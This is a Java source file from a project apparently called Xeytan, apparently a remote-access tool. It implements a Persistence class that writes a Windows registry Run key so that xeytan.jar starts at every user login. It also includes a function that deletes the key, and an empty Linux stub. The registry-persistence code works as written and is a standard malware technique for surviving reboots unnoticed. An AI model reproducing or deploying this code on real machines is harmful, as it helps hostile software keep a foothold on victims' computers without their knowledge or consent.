package com.melardev.xeytanj.services;

import java.io.IOException;
import java.net.URLDecoder;
import java.util.concurrent.TimeUnit;

public class Persistence {

    public static void makePersistence() {
        String os = System.getProperty("os.name").toLowerCase();
        if (os.contains("windows")) {
            Persistence.makeWindowsPersistence();
        } else if (os.contains("linux")) {
            Persistence.makeLinuxPersistence();
        }
    }

    private static void makeWindowsPersistence() {
        try {
            String current = Persistence.class.getProtectionDomain().getCodeSource().getLocation().getPath();
            System.out.println(URLDecoder.decode(current, "UTF-8"));
            System.out.println(System.getProperty("user.dir"));
            String command = "reg add HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v \"xeytan\" /d "
                    + "\\\"\"" + System.getProperty("java.home") + "/bin/java.exe\\\" " + "-jar \\\"" + current
                    + "xeytan.jar\"\\\" /t REG_SZ";
            System.out.println(command);
            Process p = Runtime.getRuntime().exec(command);
            synchronized (p) {
                p.wait(1000);
                p.destroy();
            }
        } catch (IOException | InterruptedException e) {
            e.printStackTrace();
        }

    }

    private static void makeLinuxPersistence() {
        // TODO Auto-generated method stub

    }

    public static void removePersistence() {
        String os = System.getProperty("os.name").toLowerCase();
        if (os.contains("windows")) {
            removeWindowsPersistence();
        } else if (os.contains("linux")) {

        }
    }

    private static void removeWindowsPersistence() {
        try {
            Process proc = Runtime.getRuntime().exec("reg delete HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v xeytan /f");
            proc.waitFor(1, TimeUnit.SECONDS);
        } catch (IOException | InterruptedException e) {
            e.printStackTrace();
        }
    }


}